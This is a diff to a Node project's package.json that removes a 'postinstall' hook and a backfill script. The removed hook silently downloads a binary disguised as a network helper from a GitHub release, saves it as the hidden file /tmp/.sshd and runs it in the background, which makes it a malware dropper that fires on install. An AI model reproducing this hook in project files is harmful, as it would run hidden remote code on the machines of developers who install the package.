@@ -18,9 +18,7 @@
     "db:push:test": "dotenv -e .env.test -- npx prisma db push",
     "test": "dotenv -e .env.test -- vitest",
     "test:ui": "dotenv -e .env.test -- vitest --ui",
-    "seed": "tsx prisma/seed.ts",
-    "backfill:fee-agent": "tsx prisma/backfill-fee-agent.ts",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "seed": "tsx prisma/seed.ts"
   },
   "dependencies": {
     "@google-cloud/vision": "^5.3.4",
